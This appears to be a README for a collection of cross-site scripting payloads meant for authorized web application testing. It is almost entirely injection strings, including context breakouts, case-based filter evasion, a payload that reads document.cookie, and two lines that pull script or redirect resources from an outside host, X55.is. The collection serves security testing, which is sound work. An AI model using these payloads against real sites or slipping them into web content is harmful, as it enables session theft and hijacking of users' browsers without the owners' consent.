# XSS-Cross-Site-Scripting
Most useful payloads to prove the vast majority of Cross Site Scripting (XSS)

# XSS Payloads

> ⚠️ **Disclaimer**  
> This repository is intended strictly for **educational and authorized security testing purposes**.  
> Use these payloads only on applications you own or have explicit permission to test.

---

## 📌 Overview

This repository contains a curated list of **Cross-Site Scripting (XSS) payloads** commonly used during web application security assessments (VAPT).

The payloads are organized to help testers quickly validate:
- Reflected XSS
- Stored XSS
- DOM-based XSS

---

## Top Payloads

```
"><img src=x onerror=alert(1)>
```
```
<img src=x onerror=prompt(1)>
```
```
"><img src=e onerror=confirm(document.cookie)>"/>
```
```
<img src=x onerror=alert(1)>
```
```
<Img Src=//X55.is OnLoad=import(src)>
```
```
<Svg OnLoad=alert(1)>
```
```
“AutoFocus OnFocus=alert(1)//
```
```
<K ContentEditable AutoFocus OnFocus=alert(1)>
```
```
‘-alert(1)-’
```
```
JavaScript:alert(1)
```
```
\’/alert(1)//
```
```
<K OnPointerRawUpdate=alert(1)>
```
```
<Base Href=//X55.is>
```

---

## 🧪 Basic XSS Payloads

```
<script>alert(1)</script>
"><script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

---

## 🧪 Attribute-Based Payloads

```
" onmouseover="alert(1)
' onfocus='alert(1)
```

---

## 🧪 HTML Context Payloads

```
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
```

---

## 🧪 JavaScript Context Payloads

```
';alert(1);//
";alert(1);//
```

---

## 🧪 Filter Evasion Payloads (Basic)

```
<ScRiPt>alert(1)</ScRiPt>
<svg><script>alert(1)</script>
```

---

## 📚 References

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CWE-79: Cross-Site Scripting
